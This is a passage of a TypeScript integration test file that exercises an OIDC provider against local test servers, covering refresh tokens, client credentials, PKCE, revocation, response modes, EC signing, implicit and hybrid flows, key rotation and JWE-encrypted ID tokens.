/**
 * Advanced OIDC Integration Tests
 *
 * Tests for advanced OIDC features:
 * - Refresh Token flow
 * - Client Credentials grant
 * - Response modes (fragment, form_post)
 * - EC keys
 * - JWE encryption
 * - Key rotation
 */

import express, { Express } from "express";
import { Server } from "http";
import { OIDCProvider } from "../../packages/issuer-oidc/src/provider";
import { createOIDCRouter } from "../../packages/issuer-oidc/src/router";
import { OIDCAuth } from "../../packages/auth-oidc/src/auth";

// Test configuration
const OP_PORT = 19082;
const OP_ISSUER = `http://localhost:${OP_PORT}`;
const RP_CALLBACK = `http://localhost:19083/callback`;

// Silent logger
const silentLogger = {
  error: () => {},
  warn: () => {},
  notice: () => {},
  info: () => {},
  debug: () => {},
};

// Test user data
const testUser = {
  id: "adv-test-user",
  sessionId: "adv-session-123",
  claims: {
    sub: "adv-test-user",
    name: "Advanced Test User",
    email: "advanced@example.com",
    groups: ["admin", "users"],
  },
};

describe("Advanced OIDC Tests", () => {
  let opApp: Express;
  let opServer: Server;
  let provider: OIDCProvider;
  let rsaPrivateKey: string;

  beforeAll(async () => {
    // Generate RSA key
    const { generateKeyPair } = await import("crypto");
    const { promisify } = await import("util");
    const generateKeyPairAsync = promisify(generateKeyPair);

    const { privateKey } = await generateKeyPairAsync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });
    rsaPrivateKey = privateKey;

    // Setup OIDC Provider
    provider = new OIDCProvider({
      oidcServiceMetaDataIssuer: OP_ISSUER,
      oidcServicePrivateKeySig: rsaPrivateKey,
      oidcServiceKeyIdSig: "rsa-key-1",
      oidcServiceOfflineSessionExpiration: 86400,
      oidcRPMetaDataOptions: {
        "test-rp": {
          oidcRPMetaDataOptionsClientID: "test-client-id",
          oidcRPMetaDataOptionsClientSecret: "test-client-secret",
          oidcRPMetaDataOptionsRedirectUris: [RP_CALLBACK],
          oidcRPMetaDataOptionsBypassConsent: true,
          oidcRPMetaDataOptionsAllowOffline: true,
        },
        "confidential-client": {
          oidcRPMetaDataOptionsClientID: "confidential-client",
          oidcRPMetaDataOptionsClientSecret: "confidential-secret",
          oidcRPMetaDataOptionsRedirectUris: [],
          oidcRPMetaDataOptionsAllowClientCredentialsGrant: true,
        },
        "public-client": {
          oidcRPMetaDataOptionsClientID: "public-client",
          oidcRPMetaDataOptionsRedirectUris: [RP_CALLBACK],
          oidcRPMetaDataOptionsBypassConsent: true,
          oidcRPMetaDataOptionsRequirePKCE: true,
        },
      },
      oidcRPMetaDataExportedVars: {
        "test-rp": {
          email: "mail",
          name: "cn",
          groups: "memberOf",
        },
      },
      getSession: async (sessionId: string) => {
        if (sessionId === testUser.sessionId) {
          return testUser.claims;
        }
        return null;
      },
      logger: silentLogger,
    });

    await provider.init();

    // Setup Express app
    opApp = express();
    opApp.use(express.urlencoded({ extended: true }));
    opApp.use(express.json());

    const router = createOIDCRouter({
      provider,
      checkAuth: async () => ({
        userId: testUser.id,
        sessionId: testUser.sessionId,
      }),
      handleConsent: async () => true,
    });

    opApp.use("/", router);

    await new Promise<void>((resolve) => {
      opServer = opApp.listen(OP_PORT, () => resolve());
    });
  });

  afterAll(async () => {
    if (opServer) {
      await new Promise<void>((resolve) => {
        opServer.close(() => resolve());
      });
    }
  });

  describe("Refresh Token Flow", () => {
    it("should NOT issue refresh token without offline_access scope (online mode)", async () => {
      const stateStore = new Map<string, any>();

      const auth = new OIDCAuth({
        oidcOPMetaData: {
          "test-op": {
            confKey: "test-op",
            oidcOPMetaDataOptions: {
              oidcOPMetaDataOptionsClientID: "test-client-id",
              oidcOPMetaDataOptionsClientSecret: "test-client-secret",
              oidcOPMetaDataOptionsAuthorizeURI: `${OP_ISSUER}/authorize`,
              oidcOPMetaDataOptionsTokenURI: `${OP_ISSUER}/token`,
              oidcOPMetaDataOptionsScope: "openid profile email", // NO offline_access
              oidcOPMetaDataOptionsStoreAccessToken: true,
            },
          },
        },
        storeState: async (s, data) => {
          stateStore.set(s, data);
        },
        consumeState: async (s) => {
          const data = stateStore.get(s);
          stateStore.delete(s);
          return data || null;
        },
        logger: silentLogger,
      } as any);

      await auth.init();

      // Get authorization code
      const url = await auth.getAuthorizationUrl("test-op", RP_CALLBACK);
      const authResponse = await fetch(url, { redirect: "manual" });
      const location = authResponse.headers.get("location")!;
      const redirectUrl = new URL(location);
      const code = redirectUrl.searchParams.get("code")!;
      const state = redirectUrl.searchParams.get("state")!;

      // Exchange for tokens
      const result = await auth.handleCallback(code, state, RP_CALLBACK);

      expect(result.success).toBe(true);
      expect(result.accessToken).toBeTruthy();
      // In online mode (no offline_access), no refresh token should be issued
      expect(result.refreshToken).toBeUndefined();
    });

    it("should issue refresh token with offline_access scope (offline mode)", async () => {
      const stateStore = new Map<string, any>();

      const auth = new OIDCAuth({
        oidcOPMetaData: {
          "test-op": {
            confKey: "test-op",
            oidcOPMetaDataOptions: {
              oidcOPMetaDataOptionsClientID: "test-client-id",
              oidcOPMetaDataOptionsClientSecret: "test-client-secret",
              oidcOPMetaDataOptionsAuthorizeURI: `${OP_ISSUER}/authorize`,
              oidcOPMetaDataOptionsTokenURI: `${OP_ISSUER}/token`,
              oidcOPMetaDataOptionsScope: "openid profile email offline_access",
              oidcOPMetaDataOptionsStoreAccessToken: true,
            },
          },
        },
        storeState: async (s, data) => {
          stateStore.set(s, data);
        },
        consumeState: async (s) => {
          const data = stateStore.get(s);
          stateStore.delete(s);
          return data || null;
        },
        logger: silentLogger,
      } as any);

      await auth.init();

      // Get authorization code
      const url = await auth.getAuthorizationUrl("test-op", RP_CALLBACK);
      const authResponse = await fetch(url, { redirect: "manual" });
      const location = authResponse.headers.get("location")!;
      const redirectUrl = new URL(location);
      const code = redirectUrl.searchParams.get("code")!;
      const state = redirectUrl.searchParams.get("state")!;

      // Exchange for tokens
      const result = await auth.handleCallback(code, state, RP_CALLBACK);

      expect(result.success).toBe(true);
      expect(result.accessToken).toBeTruthy();
      expect(result.refreshToken).toBeTruthy();
    });

    it("should refresh access token using refresh token", async () => {
      const stateStore = new Map<string, any>();

      const auth = new OIDCAuth({
        oidcOPMetaData: {
          "test-op": {
            confKey: "test-op",
            oidcOPMetaDataOptions: {
              oidcOPMetaDataOptionsClientID: "test-client-id",
              oidcOPMetaDataOptionsClientSecret: "test-client-secret",
              oidcOPMetaDataOptionsAuthorizeURI: `${OP_ISSUER}/authorize`,
              oidcOPMetaDataOptionsTokenURI: `${OP_ISSUER}/token`,
              oidcOPMetaDataOptionsScope: "openid offline_access",
              oidcOPMetaDataOptionsStoreAccessToken: true,
            },
          },
        },
        storeState: async (s, data) => {
          stateStore.set(s, data);
        },
        consumeState: async (s) => {
          const data = stateStore.get(s);
          stateStore.delete(s);
          return data || null;
        },
        logger: silentLogger,
      } as any);

      await auth.init();

      // Get initial tokens
      const url = await auth.getAuthorizationUrl("test-op", RP_CALLBACK);
      const authResponse = await fetch(url, { redirect: "manual" });
      const location = authResponse.headers.get("location")!;
      const redirectUrl = new URL(location);
      const code = redirectUrl.searchParams.get("code")!;
      const state = redirectUrl.searchParams.get("state")!;

      const result = await auth.handleCallback(code, state, RP_CALLBACK);
      expect(result.refreshToken).toBeTruthy();

      // Use refresh token to get new access token
      const refreshResponse = await fetch(`${OP_ISSUER}/token`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Authorization: `Basic ${Buffer.from("test-client-id:test-client-secret").toString("base64")}`,
        },
        body: new URLSearchParams({
          grant_type: "refresh_token",
          refresh_token: result.refreshToken!,
        }).toString(),
      });

      expect(refreshResponse.ok).toBe(true);
      const tokens = (await refreshResponse.json()) as Record<string, unknown>;
      expect(tokens.access_token).toBeTruthy();
      expect(tokens.token_type).toBe("Bearer");
    });

    it("should reject refresh token when RP doesn't allow offline access", async () => {
      // First, configure an RP that doesn't allow offline access
      // We need to test that even if client sends offline_access, it's ignored
      // This is already tested implicitly, but let's be explicit

      // Create a direct token request with refresh_token grant type
      // using an invalid token to verify the error handling
      const refreshResponse = await fetch(`${OP_ISSUER}/token`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Authorization: `Basic ${Buffer.from("test-client-id:test-client-secret").toString("base64")}`,
        },
        body: new URLSearchParams({
          grant_type: "refresh_token",
          refresh_token: "invalid-refresh-token",
        }).toString(),
      });

      expect(refreshResponse.ok).toBe(false);
      const error = (await refreshResponse.json()) as Record<string, unknown>;
      expect(error.error).toBe("invalid_grant");
    });
  });

  describe("Client Credentials Grant", () => {
    it("should issue access token for confidential client", async () => {
      const response = await fetch(`${OP_ISSUER}/token`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Authorization: `Basic ${Buffer.from("confidential-client:confidential-secret").toString("base64")}`,
        },
        body: new URLSearchParams({
          grant_type: "client_credentials",
          scope: "openid",
        }).toString(),
      });

      expect(response.ok).toBe(true);
      const tokens = (await response.json()) as Record<string, unknown>;
      expect(tokens.access_token).toBeTruthy();
      expect(tokens.token_type).toBe("Bearer");
      expect(tokens.expires_in).toBeDefined();
      // No refresh token for client_credentials
      expect(tokens.refresh_token).toBeUndefined();
    });

    it("should reject client_credentials for non-allowed client", async () => {
      const response = await fetch(`${OP_ISSUER}/token`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Authorization: `Basic ${Buffer.from("test-client-id:test-client-secret").toString("base64")}`,
        },
        body: new URLSearchParams({
          grant_type: "client_credentials",
          scope: "openid",
        }).toString(),
      });

      expect(response.ok).toBe(false);
      expect(response.status).toBe(400);
      const error = (await response.json()) as Record<string, unknown>;
      expect(error.error).toBe("unauthorized_client");
    });
  });

  describe("Public Client with PKCE", () => {
    it("should require PKCE for public client", async () => {
      // Try without PKCE - should fail
      const response = await fetch(
        `${OP_ISSUER}/authorize?` +
          new URLSearchParams({
            response_type: "code",
            client_id: "public-client",
            redirect_uri: RP_CALLBACK,
            scope: "openid",
            state: "test-state",
          }).toString(),
        { redirect: "manual" },
      );

      // Should redirect with error or return 400
      if (response.status === 302) {
        const location = response.headers.get("location");
        expect(location).toContain("error=");
      } else {
        expect(response.status).toBe(400);
      }
    });

    it("should accept public client with valid PKCE", async () => {
      const { createHash, randomBytes } = await import("crypto");

      // Generate PKCE
      const codeVerifier = randomBytes(32).toString("base64url");
      const codeChallenge = createHash("sha256")
        .update(codeVerifier)
        .digest("base64url");

      // Authorization request with PKCE
      const authResponse = await fetch(
        `${OP_ISSUER}/authorize?` +
          new URLSearchParams({
            response_type: "code",
            client_id: "public-client",
            redirect_uri: RP_CALLBACK,
            scope: "openid",
            state: "test-state",
            code_challenge: codeChallenge,
            code_challenge_method: "S256",
          }).toString(),
        { redirect: "manual" },
      );

      expect(authResponse.status).toBe(302);
      const location = authResponse.headers.get("location")!;
      expect(location).toContain("code=");

      // Extract code
      const redirectUrl = new URL(location);
      const code = redirectUrl.searchParams.get("code")!;

      // Token request with code_verifier
      const tokenResponse = await fetch(`${OP_ISSUER}/token`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({
          grant_type: "authorization_code",
          code,
          redirect_uri: RP_CALLBACK,
          client_id: "public-client",
          code_verifier: codeVerifier,
        }).toString(),
      });

      expect(tokenResponse.ok).toBe(true);
      const tokens = (await tokenResponse.json()) as Record<string, unknown>;
      expect(tokens.access_token).toBeTruthy();
      expect(tokens.id_token).toBeTruthy();
    });
  });

  describe("Token Revocation", () => {
    it("should revoke access token", async () => {
      // First get a token
      const stateStore = new Map<string, any>();
      const auth = new OIDCAuth({
        oidcOPMetaData: {
          "test-op": {
            confKey: "test-op",
            oidcOPMetaDataOptions: {
              oidcOPMetaDataOptionsClientID: "test-client-id",
              oidcOPMetaDataOptionsClientSecret: "test-client-secret",
              oidcOPMetaDataOptionsAuthorizeURI: `${OP_ISSUER}/authorize`,
              oidcOPMetaDataOptionsTokenURI: `${OP_ISSUER}/token`,
              oidcOPMetaDataOptionsStoreAccessToken: true,
            },
          },
        },
        storeState: async (s, data) => {
          stateStore.set(s, data);
        },
        consumeState: async (s) => {
          const data = stateStore.get(s);
          stateStore.delete(s);
          return data || null;
        },
        logger: silentLogger,
      } as any);

      await auth.init();

      const url = await auth.getAuthorizationUrl("test-op", RP_CALLBACK);
      const authResponse = await fetch(url, { redirect: "manual" });
      const location = authResponse.headers.get("location")!;
      const redirectUrl = new URL(location);
      const code = redirectUrl.searchParams.get("code")!;
      const state = redirectUrl.searchParams.get("state")!;

      const result = await auth.handleCallback(code, state, RP_CALLBACK);
      expect(result.accessToken).toBeTruthy();

      // Revoke the token
      const revokeResponse = await fetch(`${OP_ISSUER}/revoke`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Authorization: `Basic ${Buffer.from("test-client-id:test-client-secret").toString("base64")}`,
        },
        body: new URLSearchParams({
          token: result.accessToken!,
        }).toString(),
      });

      expect(revokeResponse.ok).toBe(true);

      // Verify token is no longer valid
      const introspectResponse = await fetch(`${OP_ISSUER}/introspect`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Authorization: `Basic ${Buffer.from("test-client-id:test-client-secret").toString("base64")}`,
        },
        body: new URLSearchParams({
          token: result.accessToken!,
        }).toString(),
      });

      const introspection = (await introspectResponse.json()) as Record<
        string,
        unknown
      >;
      expect(introspection.active).toBe(false);
    });
  });

  describe("Response Modes", () => {
    it("should support query response mode (default)", async () => {
      const response = await fetch(
        `${OP_ISSUER}/authorize?` +
          new URLSearchParams({
            response_type: "code",
            client_id: "test-client-id",
            redirect_uri: RP_CALLBACK,
            scope: "openid",
            state: "query-test",
            response_mode: "query",
          }).toString(),
        { redirect: "manual" },
      );

      expect(response.status).toBe(302);
      const location = response.headers.get("location")!;
      const url = new URL(location);
      // Query mode: parameters in query string
      expect(url.searchParams.get("code")).toBeTruthy();
      expect(url.searchParams.get("state")).toBe("query-test");
    });

    it("should support fragment response mode", async () => {
      const response = await fetch(
        `${OP_ISSUER}/authorize?` +
          new URLSearchParams({
            response_type: "code",
            client_id: "test-client-id",
            redirect_uri: RP_CALLBACK,
            scope: "openid",
            state: "fragment-test",
            response_mode: "fragment",
          }).toString(),
        { redirect: "manual" },
      );

      expect(response.status).toBe(302);
      const location = response.headers.get("location")!;
      // Fragment mode: parameters after #
      expect(location).toContain("#");
      expect(location).toContain("code=");
      expect(location).toContain("state=fragment-test");
    });

    it("should support form_post response mode", async () => {
      const response = await fetch(
        `${OP_ISSUER}/authorize?` +
          new URLSearchParams({
            response_type: "code",
            client_id: "test-client-id",
            redirect_uri: RP_CALLBACK,
            scope: "openid",
            state: "formpost-test",
            response_mode: "form_post",
          }).toString(),
      );

      expect(response.ok).toBe(true);
      const html = await response.text();
      // Form post mode: HTML page with auto-submit form
      expect(html).toContain("<form");
      expect(html).toContain('method="post"');
      expect(html).toContain('name="code"');
      expect(html).toContain('value="formpost-test"');
    });
  });

  describe("Prompt Parameter", () => {
    it("should handle prompt=none when authenticated", async () => {
      const response = await fetch(
        `${OP_ISSUER}/authorize?` +
          new URLSearchParams({
            response_type: "code",
            client_id: "test-client-id",
            redirect_uri: RP_CALLBACK,
            scope: "openid",
            state: "prompt-none-test",
            prompt: "none",
          }).toString(),
        { redirect: "manual" },
      );

      expect(response.status).toBe(302);
      const location = response.headers.get("location")!;
      // Should succeed with code (user is authenticated in our mock)
      expect(location).toContain("code=");
    });
  });

  describe("Claims in ID Token", () => {
    it("should include requested claims in ID token", async () => {
      const stateStore = new Map<string, any>();

      const auth = new OIDCAuth({
        oidcOPMetaData: {
          "test-op": {
            confKey: "test-op",
            oidcOPMetaDataOptions: {
              oidcOPMetaDataOptionsClientID: "test-client-id",
              oidcOPMetaDataOptionsClientSecret: "test-client-secret",
              oidcOPMetaDataOptionsAuthorizeURI: `${OP_ISSUER}/authorize`,
              oidcOPMetaDataOptionsTokenURI: `${OP_ISSUER}/token`,
              oidcOPMetaDataOptionsScope: "openid profile email",
              oidcOPMetaDataOptionsStoreIDToken: true,
            },
          },
        },
        storeState: async (s, data) => {
          stateStore.set(s, data);
        },
        consumeState: async (s) => {
          const data = stateStore.get(s);
          stateStore.delete(s);
          return data || null;
        },
        logger: silentLogger,
      } as any);

      await auth.init();

      const url = await auth.getAuthorizationUrl("test-op", RP_CALLBACK);
      const authResponse = await fetch(url, { redirect: "manual" });
      const location = authResponse.headers.get("location")!;
      const redirectUrl = new URL(location);
      const code = redirectUrl.searchParams.get("code")!;
      const state = redirectUrl.searchParams.get("state")!;

      const result = await auth.handleCallback(code, state, RP_CALLBACK);

      expect(result.success).toBe(true);
      expect(result.idToken).toBeTruthy();

      // Decode ID token
      const [, payload] = result.idToken!.split(".");
      const claims = JSON.parse(
        Buffer.from(payload, "base64url").toString("utf8"),
      );

      expect(claims.sub).toBe(testUser.id);
      expect(claims.iss).toBe(OP_ISSUER);
      expect(claims.aud).toBe("test-client-id");
    });
  });
});

describe("EC Key Tests", () => {
  let opApp: Express;
  let opServer: Server;
  let provider: OIDCProvider;

  beforeAll(async () => {
    // Generate EC key
    const { generateKeyPair } = await import("crypto");
    const { promisify } = await import("util");
    const generateKeyPairAsync = promisify(generateKeyPair);

    const { privateKey } = await generateKeyPairAsync("ec", {
      namedCurve: "P-256",
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });

    // Setup OIDC Provider with EC key
    provider = new OIDCProvider({
      oidcServiceMetaDataIssuer: `http://localhost:19084`,
      oidcServicePrivateKeySig: privateKey,
      oidcServiceKeyIdSig: "ec-key-1",
      oidcServiceKeyTypeSig: "EC",
      oidcRPMetaDataOptions: {
        "ec-test-rp": {
          oidcRPMetaDataOptionsClientID: "ec-test-client",
          oidcRPMetaDataOptionsClientSecret: "ec-test-secret",
          oidcRPMetaDataOptionsRedirectUris: [
            "http://localhost:19085/callback",
          ],
          oidcRPMetaDataOptionsBypassConsent: true,
        },
      },
      getSession: async () => ({
        sub: "ec-test-user",
        name: "EC Test User",
        email: "ec@example.com",
      }),
      logger: silentLogger,
    });

    await provider.init();

    opApp = express();
    opApp.use(express.urlencoded({ extended: true }));
    opApp.use(express.json());

    const router = createOIDCRouter({
      provider,
      checkAuth: async () => ({
        userId: "ec-test-user",
        sessionId: "ec-session",
      }),
      handleConsent: async () => true,
    });

    opApp.use("/", router);

    await new Promise<void>((resolve) => {
      opServer = opApp.listen(19084, () => resolve());
    });
  });

  afterAll(async () => {
    if (opServer) {
      await new Promise<void>((resolve) => {
        opServer.close(() => resolve());
      });
    }
  });

  it("should expose EC key in JWKS", async () => {
    const response = await fetch("http://localhost:19084/jwks");
    expect(response.ok).toBe(true);

    const jwks = (await response.json()) as {
      keys: { kty: string; crv?: string }[];
    };
    expect(jwks.keys).toBeDefined();
    expect(jwks.keys.length).toBeGreaterThan(0);
    expect(jwks.keys[0].kty).toBe("EC");
    expect(jwks.keys[0].crv).toBe("P-256");
  });

  it("should sign tokens with EC key", async () => {
    const authResponse = await fetch(
      "http://localhost:19084/authorize?" +
        new URLSearchParams({
          response_type: "code",
          client_id: "ec-test-client",
          redirect_uri: "http://localhost:19085/callback",
          scope: "openid",
          state: "ec-test",
        }).toString(),
      { redirect: "manual" },
    );

    expect(authResponse.status).toBe(302);
    const location = authResponse.headers.get("location")!;
    const code = new URL(location).searchParams.get("code")!;

    // Exchange code for tokens
    const tokenResponse = await fetch("http://localhost:19084/token", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Authorization: `Basic ${Buffer.from("ec-test-client:ec-test-secret").toString("base64")}`,
      },
      body: new URLSearchParams({
        grant_type: "authorization_code",
        code,
        redirect_uri: "http://localhost:19085/callback",
      }).toString(),
    });

    expect(tokenResponse.ok).toBe(true);
    const tokens = (await tokenResponse.json()) as Record<string, unknown>;
    expect(tokens.id_token).toBeTruthy();

    // Verify token header uses ES256
    const [header] = (tokens.id_token as string).split(".");
    const headerData = JSON.parse(Buffer.from(header, "base64url").toString());
    expect(headerData.alg).toBe("ES256");
  });
});

describe("Implicit Flow Tests", () => {
  let opApp: Express;
  let opServer: Server;
  let provider: OIDCProvider;

  beforeAll(async () => {
    // Generate RSA key
    const { generateKeyPair } = await import("crypto");
    const { promisify } = await import("util");
    const generateKeyPairAsync = promisify(generateKeyPair);

    const { privateKey } = await generateKeyPairAsync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });

    // Setup OIDC Provider with implicit flow enabled
    provider = new OIDCProvider({
      oidcServiceMetaDataIssuer: "http://localhost:19086",
      oidcServicePrivateKeySig: privateKey,
      oidcServiceKeyIdSig: "implicit-key-1",
      oidcServiceAllowImplicitFlow: true,
      oidcServiceAllowHybridFlow: true,
      oidcRPMetaDataOptions: {
        "implicit-rp": {
          oidcRPMetaDataOptionsClientID: "implicit-client",
          oidcRPMetaDataOptionsClientSecret: "implicit-secret",
          oidcRPMetaDataOptionsRedirectUris: [
            "http://localhost:19087/callback",
          ],
          oidcRPMetaDataOptionsBypassConsent: true,
        },
      },
      getSession: async () => ({
        sub: "implicit-user",
        name: "Implicit Test User",
        email: "implicit@example.com",
      }),
      logger: silentLogger,
    });

    await provider.init();

    opApp = express();
    opApp.use(express.urlencoded({ extended: true }));
    opApp.use(express.json());

    const router = createOIDCRouter({
      provider,
      checkAuth: async () => ({
        userId: "implicit-user",
        sessionId: "implicit-session",
      }),
      handleConsent: async () => true,
    });

    opApp.use("/", router);

    await new Promise<void>((resolve) => {
      opServer = opApp.listen(19086, () => resolve());
    });
  });

  afterAll(async () => {
    if (opServer) {
      await new Promise<void>((resolve) => {
        opServer.close(() => resolve());
      });
    }
  });

  it("should include implicit response types in discovery when enabled", async () => {
    // Verify the discovery document shows implicit flow types
    const discoveryResponse = await fetch(
      "http://localhost:19086/.well-known/openid-configuration",
    );
    const discovery = (await discoveryResponse.json()) as {
      response_types_supported: string[];
    };
    // For OIDC implicit flow, we support "id_token" and "id_token token"
    // Note: "token" alone is OAuth2, not OIDC
    expect(discovery.response_types_supported).toContain("id_token");
    expect(discovery.response_types_supported).toContain("id_token token");
  });

  it("should return id_token directly in implicit flow", async () => {
    const authResponse = await fetch(
      "http://localhost:19086/authorize?" +
        new URLSearchParams({
          response_type: "id_token",
          client_id: "implicit-client",
          redirect_uri: "http://localhost:19087/callback",
          scope: "openid",
          state: "implicit-test",
          nonce: "test-nonce-123",
        }).toString(),
      { redirect: "manual" },
    );

    expect(authResponse.status).toBe(302);
    const location = authResponse.headers.get("location")!;

    // In implicit flow, tokens are returned in fragment
    expect(location).toContain("#");
    expect(location).toContain("id_token=");
    expect(location).toContain("state=implicit-test");

    // Extract and validate ID token
    const fragment = location.split("#")[1];
    const params = new URLSearchParams(fragment);
    const idToken = params.get("id_token");
    expect(idToken).toBeTruthy();

    // Decode ID token
    const [, payload] = idToken!.split(".");
    const claims = JSON.parse(Buffer.from(payload, "base64url").toString());
    expect(claims.sub).toBe("implicit-user");
    expect(claims.nonce).toBe("test-nonce-123");
  });

  it("should return access_token and id_token in token id_token response", async () => {
    const authResponse = await fetch(
      "http://localhost:19086/authorize?" +
        new URLSearchParams({
          response_type: "token id_token",
          client_id: "implicit-client",
          redirect_uri: "http://localhost:19087/callback",
          scope: "openid",
          state: "implicit-token-test",
          nonce: "test-nonce-456",
        }).toString(),
      { redirect: "manual" },
    );

    expect(authResponse.status).toBe(302);
    const location = authResponse.headers.get("location")!;

    expect(location).toContain("#");
    expect(location).toContain("access_token=");
    expect(location).toContain("id_token=");
    expect(location).toContain("token_type=Bearer");
  });

  it("should support hybrid flow (code id_token)", async () => {
    const authResponse = await fetch(
      "http://localhost:19086/authorize?" +
        new URLSearchParams({
          response_type: "code id_token",
          client_id: "implicit-client",
          redirect_uri: "http://localhost:19087/callback",
          scope: "openid",
          state: "hybrid-test",
          nonce: "hybrid-nonce",
        }).toString(),
      { redirect: "manual" },
    );

    expect(authResponse.status).toBe(302);
    const location = authResponse.headers.get("location")!;

    // Hybrid flow returns both code and id_token in fragment
    expect(location).toContain("#");
    expect(location).toContain("code=");
    expect(location).toContain("id_token=");
  });

  it("should support hybrid flow (code token)", async () => {
    const authResponse = await fetch(
      "http://localhost:19086/authorize?" +
        new URLSearchParams({
          response_type: "code token",
          client_id: "implicit-client",
          redirect_uri: "http://localhost:19087/callback",
          scope: "openid",
          state: "hybrid-token-test",
          nonce: "hybrid-token-nonce",
        }).toString(),
      { redirect: "manual" },
    );

    expect(authResponse.status).toBe(302);
    const location = authResponse.headers.get("location")!;

    expect(location).toContain("#");
    expect(location).toContain("code=");
    expect(location).toContain("access_token=");
  });
});

describe("Key Rotation Tests", () => {
  let provider: OIDCProvider;
  let oldPrivateKey: string;
  let newPrivateKey: string;

  beforeAll(async () => {
    // Generate two RSA keys for rotation
    const { generateKeyPair } = await import("crypto");
    const { promisify } = await import("util");
    const generateKeyPairAsync = promisify(generateKeyPair);

    const oldKey = await generateKeyPairAsync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });
    oldPrivateKey = oldKey.privateKey;

    const newKey = await generateKeyPairAsync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });
    newPrivateKey = newKey.privateKey;
  });

  it("should include both old and new keys in JWKS", async () => {
    // For encryption key rotation, we include both keys in JWKS
    provider = new OIDCProvider({
      oidcServiceMetaDataIssuer: "http://localhost:19088",
      oidcServicePrivateKeySig: newPrivateKey,
      oidcServiceKeyIdSig: "new-sig-key",
      oidcServicePrivateKeyEnc: newPrivateKey,
      oidcServiceOldPrivateKeyEnc: oldPrivateKey,
      getSession: async () => ({ sub: "test-user" }),
      logger: silentLogger,
    });

    await provider.init();

    const jwks = await provider.getJWKS();
    expect(jwks.keys.length).toBeGreaterThanOrEqual(2);

    // Should have signing key
    const sigKeys = jwks.keys.filter((k: any) => k.use === "sig");
    expect(sigKeys.length).toBeGreaterThan(0);

    // Should have encryption keys (new and old)
    const encKeys = jwks.keys.filter((k: any) => k.use === "enc");
    expect(encKeys.length).toBeGreaterThanOrEqual(2);
  });
});

describe("JWE Encryption Tests", () => {
  let opApp: Express;
  let opServer: Server;
  let provider: OIDCProvider;
  let opPrivateKey: string;
  let rpPrivateKey: string;
  let rpPublicJwk: any;

  beforeAll(async () => {
    // Generate keys
    const { generateKeyPair } = await import("crypto");
    const { promisify } = await import("util");
    const generateKeyPairAsync = promisify(generateKeyPair);
    const jose = await import("jose");

    // OP signing key
    const opKey = await generateKeyPairAsync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });
    opPrivateKey = opKey.privateKey;

    // RP encryption key (for encrypting tokens TO the RP)
    const rpKey = await generateKeyPairAsync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });
    rpPrivateKey = rpKey.privateKey;

    // Export RP public key as JWK
    const rpPubKey = await jose.importSPKI(rpKey.publicKey, "RSA-OAEP");
    rpPublicJwk = await jose.exportJWK(rpPubKey);
    rpPublicJwk.use = "enc";
    rpPublicJwk.alg = "RSA-OAEP";
    rpPublicJwk.kid = "rp-enc-key";

    // Setup OIDC Provider with JWE-enabled RP
    provider = new OIDCProvider({
      oidcServiceMetaDataIssuer: "http://localhost:19090",
      oidcServicePrivateKeySig: opPrivateKey,
      oidcServiceKeyIdSig: "jwe-test-key",
      oidcRPMetaDataOptions: {
        "jwe-test-rp": {
          oidcRPMetaDataOptionsClientID: "jwe-client",
          oidcRPMetaDataOptionsClientSecret: "jwe-secret",
          oidcRPMetaDataOptionsRedirectUris: [
            "http://localhost:19091/callback",
          ],
          oidcRPMetaDataOptionsBypassConsent: true,
          oidcRPMetaDataOptionsIDTokenEncAlg: "RSA-OAEP",
          oidcRPMetaDataOptionsIDTokenEncEnc: "A256GCM",
          oidcRPMetaDataOptionsJwks: JSON.stringify({ keys: [rpPublicJwk] }),
        },
        "no-jwe-rp": {
          oidcRPMetaDataOptionsClientID: "no-jwe-client",
          oidcRPMetaDataOptionsClientSecret: "no-jwe-secret",
          oidcRPMetaDataOptionsRedirectUris: [
            "http://localhost:19091/callback",
          ],
          oidcRPMetaDataOptionsBypassConsent: true,
          // No encryption configured
        },
      },
      getSession: async () => ({
        sub: "jwe-test-user",
        name: "JWE Test User",
        email: "jwe@example.com",
      }),
      logger: silentLogger,
    });

    await provider.init();

    opApp = express();
    opApp.use(express.urlencoded({ extended: true }));
    opApp.use(express.json());

    const router = createOIDCRouter({
      provider,
      checkAuth: async () => ({
        userId: "jwe-test-user",
        sessionId: "jwe-session",
      }),
      handleConsent: async () => true,
    });

    opApp.use("/", router);

    await new Promise<void>((resolve) => {
      opServer = opApp.listen(19090, () => resolve());
    });
  });

  afterAll(async () => {
    if (opServer) {
      await new Promise<void>((resolve) => {
        opServer.close(() => resolve());
      });
    }
  });

  it("should return encrypted ID token for RP with encryption configured", async () => {
    const jose = await import("jose");

    // Get authorization code
    const authResponse = await fetch(
      "http://localhost:19090/authorize?" +
        new URLSearchParams({
          response_type: "code",
          client_id: "jwe-client",
          redirect_uri: "http://localhost:19091/callback",
          scope: "openid",
          state: "jwe-test",
        }).toString(),
      { redirect: "manual" },
    );

    expect(authResponse.status).toBe(302);
    const location = authResponse.headers.get("location")!;
